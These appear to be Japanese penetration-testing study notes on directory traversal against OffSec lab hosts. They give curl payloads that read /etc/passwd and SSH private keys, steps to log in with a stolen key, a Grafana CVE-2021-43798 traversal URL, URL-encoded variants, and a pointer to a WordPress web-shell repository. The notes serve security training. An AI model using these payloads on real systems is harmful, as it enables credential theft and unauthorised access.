

<details markdown="1">
<summary>Directory Traversal</summary>

```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

</details>

### ブラウザからアクセス
URLバーに以下のを入力
```bash
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

### curl
/etc/passwdファイルの取得
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```

SSH 秘密鍵の取得
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

#### 取得した秘密鍵を用いたSSHログイン
1. dt_key（秘密鍵）ファイルの作成
```bash
touch dt_key
sudo vi dt_key
```
-----BEGIN OPENSSH PRIVATE KEY-----から
-----END OPENSSH PRIVATE KEY----- までの範囲のSSH秘密鍵を貼付け

2. ファイルの読み取り権限を付与
```bash
chmod 400 dt_key
```

3. ログイン
```bash
ssh -i dt_key -p 2222 offsec@mountaindesserts.com
```

id_rsaやid_ecdsaファイルの確認  
特定のファイルが存在するか確認するために、id_rsaやid_ecdsaなどのファイルをチェックすることが重要
#### Windows環境での悪用
Windows環境では、ドライブ指定が不要なため、以下のように悪用

CVE-2021-43798の脆弱性を持つGrafanaでの例
```bash
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
```
### URLエンコード

パスが直接表示されない場合は、URLエンコードを使用してパスをエンコード
```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
```bash
curl --path-as-is http://192.168.121.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
```
```bash
curl --path-as-is http://192.168.121.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt
```
- %2e%2e/ <=> ../
- --path-as-is URLをエンコードしたり自動補正したりせず、そのまま送信する
#### [URLエンコードサイト](https://www.w3schools.com/tags/ref_urlencode.asp)
#### WordPressの脆弱性
簡単なエクスプロイト
WordPressの脆弱性を利用する簡単なエクスプロイト例です：

GitHubリポジトリ: leonjza/wordpress-shell
